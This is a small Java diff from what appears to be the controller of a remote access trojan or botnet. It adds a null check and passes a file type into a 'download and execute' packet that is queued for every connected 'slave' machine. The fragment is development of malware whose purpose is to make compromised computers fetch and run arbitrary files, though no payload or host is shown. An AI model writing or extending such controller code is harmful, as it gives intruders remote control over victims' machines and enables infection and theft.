@@ -1117,8 +1117,12 @@ public class Frame extends BaseFrame {
 					
 					String filetype = FrameFileType.showDialog();
 					
+					if (filetype == null) {
+						return;
+					}
+					
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new Packet17DownloadExecute(result));
+						slave.addToSendQueue(new Packet17DownloadExecute(result, filetype));
 					}
 				}
 			}
